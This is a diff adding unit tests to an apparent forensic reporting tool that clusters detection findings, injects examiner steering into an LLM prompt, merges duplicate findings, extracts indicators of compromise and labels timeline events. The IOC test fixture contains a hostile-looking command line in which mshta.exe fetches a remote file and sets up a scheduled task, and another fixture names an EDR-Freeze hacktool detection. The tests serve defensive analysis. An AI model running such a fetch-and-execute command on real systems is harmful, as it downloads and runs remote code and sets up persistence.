@@ -140,3 +140,75 @@ def test_report_llm_banner_marks_assisted_sections():
         ra.resolve_model = orig
     assert "LLM-assisted" in md
     assert "Probable sequence" in md or "s" in md
+
+
+def test_steer_instruction_reaches_cluster_prompt():
+    """4j.5i — examiner steering must be injected into the LLM prompt."""
+    import nexus.langgraph.report_analysis as ra
+
+    seen: list[str] = []
+
+    class _Spy:
+        def invoke(self, msgs):
+            seen.append(str(msgs[-1].get("content") or msgs[-1]))
+            class R:
+                content = json.dumps({"category": "execution", "what": "w"})
+            return R()
+
+    ra.analyze_cluster(
+        [_mshta_finding()], _ROWS, model=_Spy(),
+        steer="dig into the mshta chain",
+    )
+    assert any("dig into the mshta chain" in m for m in seen)
+
+
+def test_cluster_blob_collapses_duplicate_signatures():
+    """Scale: 30 identical rows → one signature row in the prompt."""
+    import nexus.langgraph.report_analysis as ra
+
+    rows = [dict(_ROWS[0]) for _ in range(30)]
+    blob = ra._cluster_blob([_mshta_finding()], rows)
+    assert "30 rows grouped into" in blob
+    assert blob.count("\n- ") <= 17  # 16 sig cap + trailing 'more' line
+
+
+def test_merge_duplicate_findings_collapses_same_signal():
+    """Re-run duplicates (same needle, approved twice) render once."""
+    from nexus.integration.dfir_report import build_dfir_markdown
+
+    f1 = _mshta_finding()
+    f1["id"] = "F-001"
+    f2 = dict(_mshta_finding())
+    f2["id"] = "F-009"
+    f2["title"] = "Signal: mshta — 42 hit(s) across hayabusa"
+    md = build_dfir_markdown(
+        case_id="CASE-X", case_name="X",
+        findings=[f1, f2], evidence=[], llm=False, include_draft=True,
+    )
+    assert "`F-001`" in md and "`F-009`" in md
+    assert md.count("#### Signal: mshta") == 1  # one section, both IDs
+
+
+def test_extract_iocs_pulls_indicators_from_rows():
+    from nexus.integration.dfir_report import _extract_iocs
+
+    rows = [{"detail": "Cmdline: mshta.exe https://hotelesms.com/talsk.txt "
+                       "/TN MSOFFICE_ — C:\Windows\System32\Tasks\MSOFFICE_"}]
+    iocs = _extract_iocs(rows)
+    assert "https://hotelesms.com/talsk.txt" in iocs["urls"]
+    assert "hotelesms.com" in iocs["domains"]
+    assert "MSOFFICE_" in iocs["tasks"]
+    assert any("Tasks" in p for p in iocs["paths"])
+
+
+def test_timeline_label_extracts_salient_text():
+    from nexus.integration.dfir_report import _timeline_label
+
+    assert "EDR-Freeze" in _timeline_label(
+        {"description": "detections: Hacktool - EDR-Freeze Execution;Other"})
+    assert "Proc Exec" in _timeline_label(
+        {"description": "RuleTitle: Proc Exec · Details: Cmdline: mshta"})
+    assert "Process creation" in _timeline_label(
+        {"description": r"MapDescription: Process creation · UserName: IEWIN7\IEUser"})
+    assert "event record" in _timeline_label(
+        {"description": "1,4125,2019-05-21 15:32:57.2,1,Info,Sysmon"})
